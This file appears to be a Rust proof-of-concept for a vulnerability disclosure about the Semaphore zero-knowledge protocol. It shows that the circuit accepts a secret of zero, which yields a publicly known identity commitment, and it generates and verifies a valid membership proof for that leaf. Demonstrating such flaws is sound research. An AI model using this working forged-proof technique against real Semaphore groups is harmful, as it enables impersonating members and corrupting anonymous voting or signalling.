//! Demonstration of a degenerate Semaphore identity based on `secret = 0`.
//!
//! What this binary shows:
//! - the Semaphore circuit accepts `secret = 0` because it only enforces
//!   `secret < l`;
//! - `secret = 0` yields the Edwards identity point as the public key;
//! - the corresponding identity commitment is public and fixed:
//!   `Poseidon(0, 1)`;
//! - if that commitment is ever inserted into a Semaphore group, anyone can
//!   generate a valid membership proof for that member because the witness
//!   secret is not secret at all.
//!
//! Scope note:
//! - this is not the same bug as the invalid-public-key signature PoC;
//! - this does not prove that the current Rust API can *honestly* create such
//!   an identity, because `Identity::new()` does not output `secret = 0`;
//! - it proves something stronger at the protocol level: the circuit and proof
//!   system accept a publicly-known witness if the corresponding degenerate
//!   commitment is admitted into the Merkle tree.

use anyhow::Result;
use ark_ed_on_bn254::Fq;
use ark_ff::PrimeField;
use circom_prover::{CircomProver, prover::ProofLib, witness::WitnessFn};
use light_poseidon::{Poseidon, PoseidonHasher};
use num_bigint::BigUint;
use semaphore::{
    group::{EMPTY_ELEMENT, Element, Group},
    utils::{download_zkey, hash, to_big_uint, to_element},
    witness::dispatch_witness,
};
use std::collections::HashMap;

const TREE_DEPTH: u16 = 10;
const MESSAGE: &str = "publicly known witness";
const SCOPE: &str = "zero-secret-demo";
const MEMBER1: Element = [1; 32];
const MEMBER2: Element = [2; 32];

fn identity_commitment_for_zero_secret() -> Fq {
    // For secret = 0, the public key is the Edwards identity point (0, 1).
    Poseidon::<Fq>::new_circom(2)
        .expect("Poseidon init failed")
        .hash(&[Fq::from(0u64), Fq::from(1u64)])
        .expect("Poseidon hash failed")
}

fn padded_siblings(group_proof: &semaphore::group::MerkleProof, depth: u16) -> Vec<Element> {
    let mut siblings = Vec::with_capacity(depth as usize);
    for i in 0..depth {
        if let Some(sibling) = group_proof.siblings.get(i as usize) {
            siblings.push(*sibling);
        } else {
            siblings.push(EMPTY_ELEMENT);
        }
    }
    siblings
}

fn main() -> Result<()> {
    let zero_secret = BigUint::ZERO;
    let zero_commitment = identity_commitment_for_zero_secret();
    let zero_member = to_element(zero_commitment);

    let group = Group::new(&[MEMBER1, MEMBER2, zero_member])?;
    let member_index = group
        .index_of(zero_member)
        .expect("degenerate commitment must be present in the group");
    let group_proof = group.generate_proof(member_index)?;
    assert!(Group::verify_proof(&group_proof));

    let scope_uint = to_big_uint(&SCOPE.to_string());
    let message_uint = to_big_uint(&MESSAGE.to_string());
    let scope_signal = BigUint::parse_bytes(hash(scope_uint.clone()).as_bytes(), 10)
        .expect("scope signal must be a decimal BigUint");
    let siblings = padded_siblings(&group_proof, TREE_DEPTH);

    let inputs = HashMap::from([
        ("secret".to_string(), vec![zero_secret.to_string()]),
        (
            "merkleProofLength".to_string(),
            vec![group_proof.siblings.len().to_string()],
        ),
        (
            "merkleProofIndex".to_string(),
            vec![group_proof.index.to_string()],
        ),
        (
            "merkleProofSiblings".to_string(),
            siblings
                .iter()
                .map(|s| BigUint::from_bytes_le(s).to_string())
                .collect(),
        ),
        ("scope".to_string(), vec![hash(scope_uint.clone())]),
        ("message".to_string(), vec![hash(message_uint.clone())]),
    ]);

    let zkey_path = download_zkey(TREE_DEPTH).map_err(|e| anyhow::anyhow!(e.to_string()))?;
    let witness_fn = dispatch_witness(TREE_DEPTH);

    let proof = CircomProver::prove(
        ProofLib::Arkworks,
        WitnessFn::CircomWitnessCalc(witness_fn),
        serde_json::to_string(&inputs)?,
        zkey_path.clone(),
    )?;

    let verified = CircomProver::verify(ProofLib::Arkworks, proof.clone(), zkey_path)?;
    assert!(verified, "the zero-secret proof should verify");

    let expected_root = BigUint::from_bytes_le(group.root().unwrap().as_ref());
    let expected_nullifier = Poseidon::<Fq>::new_circom(2)
        .expect("Poseidon init failed")
        .hash(&[
            Fq::from_le_bytes_mod_order(&scope_signal.to_bytes_le()),
            Fq::from(0u64),
        ])
        .expect("Poseidon hash failed");

    println!("Degenerate Semaphore identity demonstration");
    println!("Tree depth                 : {}", TREE_DEPTH);
    println!("Secret used in witness     : 0");
    println!("Public key implied         : Edwards identity point (0, 1)");
    println!("Identity commitment        : {}", zero_commitment);
    println!("Group member index         : {}", member_index);
    println!("Merkle root                : {}", expected_root);
    println!("Nullifier for this scope   : {}", expected_nullifier);
    println!("Proof verified             : {}", verified);
    println!();
    println!("Implication:");
    println!("  If a Semaphore group ever contains this commitment, then membership");
    println!("  for that leaf is publicly impersonable because the witness secret is");
    println!("  globally known: anyone can use `secret = 0` to produce a valid proof.");
    println!();
    println!("Protocol note:");
    println!("  The standard Rust `Identity::new()` path does not create this case.");
    println!("  The issue is that the proof circuit itself accepts it.");

    // Keep one final sanity check tied to protocol outputs.
    let public_inputs = &proof.pub_inputs.0;
    assert_eq!(public_inputs[0], expected_root);
    assert_eq!(
        public_inputs[1],
        BigUint::from_bytes_le(&to_element(expected_nullifier))
    );

    Ok(())
}
